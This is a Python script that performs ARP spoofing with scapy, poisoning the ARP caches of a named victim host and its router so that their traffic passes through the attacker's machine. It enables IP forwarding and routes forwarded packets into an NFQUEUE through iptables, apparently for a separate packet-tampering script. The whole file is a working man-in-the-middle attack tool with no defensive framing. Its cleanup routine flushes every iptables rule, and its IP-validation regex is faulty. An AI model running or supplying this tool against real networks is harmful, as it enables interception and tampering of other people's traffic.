import os
import sys
import getopt
import regex
from scapy.all import *
from scapy.layers.l2 import arping

# General variables
interface = ""
victimIP = ""
routerIP = ""

# Turns on or off scapy messages
scapyVerbose = 0

# Variables for MAC address
victimMAC = None
routerMAC = None


def print_f(string):
    """This method is required because when this python file is called as a script
    the prints don't appear and a flush is required """

    print(string)
    sys.stdout.flush()


def grab_MAC(IP):
    """Manipulates the packet layers to obtain the MAC address from the returned values"""

    ans, uans = arping(IP)
    for s, r in ans:
        return r[Ether].src


def grab_MAC_Addresses():
    """Method that grabs the victim and router MAC addresses and stores them"""

    global victimMAC
    global routerMAC
    victimMAC = grab_MAC(victimIP)
    routerMAC = grab_MAC(routerIP)

    if victimMAC is not None and routerMAC is not None:
        loop = False
        print_f("[*] MAC Addresses obtain successfully!")
        print("[*] Router mac: \'", routerMAC, '\'')
        print("[*] Victim mac: \'", victimMAC, '\'')
    else:
        exit("[!] Error obtaining MAC Addresses, trying again!")


def spoof(routerIP, victimIP):
    """Used to send out the packets to perform the spoof"""

    # Sends the arp replies
    #   "op = 2" - '2' is the opcode for a reply

    print_f("[*] Spoofing")
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=scapyVerbose)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=scapyVerbose)


def restore(routerIP, victimIP):
    """Used to restore the arp table to the original format"""

    # Restores the original config
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=victimMAC), count=4, verbose=scapyVerbose)

    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=routerMAC), count=4, verbose=scapyVerbose)


def set_ip_forward(state):
    """Method used to configure the host packet forwarding"""

    if state is True:
        # This config has been tested only on Arch linux
        os.system("sysctl net.ipv4.ip_forward=1")

        # Pushes the forwarded packets into the NFQUEUE so the Packet.py can take affect
        os.system("iptables -A FORWARD  -j NFQUEUE")

    else:
        os.system("sysctl net.ipv4.ip_forward=0")
        os.system("iptables -F")


def run():
    """Main loop method"""

    grab_MAC_Addresses()
    set_ip_forward(True)

    while True:
        try:
            spoof(routerIP, victimIP)
            time.sleep(5)

        except KeyboardInterrupt:
            print("\n[*] Spoofing stopped!")
            restore(routerIP, victimIP)
            set_ip_forward(False)
            sys.exit(0)


def valid_ip(ip_address):
    """This function uses regex to check if the IP address parameters are correct.
    It validates the range 0.0.0.0 -> 255.255.255.255"""

    print("Checking ip: ", ip_address)

    # Regular expression pattern matching for IP addresses
    pattern = \
        "(((2[0-5][0-5])|(1[0-9][0-9])|([0-9][0-9])|([0-9]))\.){3}(((2[0-5][0-5])|(1[0-9][0-9])|([0-9][0-9])|([0-9])))"

    # Pattern match
    if not regex.match(pattern, ip_address):
        print("[*] Error: Invalid IP please check your parameters!")
        sys.exit(1)


def parameters():
    """Method deals with parameters passed into the script"""

    global victimIP
    global routerIP
    global interface

    opts, args = getopt.getopt(sys.argv[1:], 'i:v:r:h', '')
    for opt, arg in opts:
        try:
            if opt == "-i":
                interface = arg
            elif opt == "-v":
                victimIP = arg
            elif opt == "-r":
                routerIP = arg
            elif opt == "-h":
                usage()
                sys.exit(0)
        except getopt.GetoptError:
            print("Error: incorrect parameters")
            usage()
            sys.exit(2)

    # Validation
    valid_ip(victimIP)
    valid_ip(routerIP)

    # Validation for parameter
    if victimIP == "" or routerIP == "" or interface == "":
        print("\nError: Invalid parameters passed, a routerIP, victimIP and interface need to be passed")
        usage()
        sys.exit(1)


def usage():
    """Issues a terminal help message"""

    print("""
        Options:
        #=================================================#
        | -h                             - Help           |
        | -v <IP_Address>                - Victim IP      |
        | -r <IP_Address>                - Router IP      |
        | -i <Interface_name>            - Interface      |
        #=================================================#
        """)


parameters()
run()
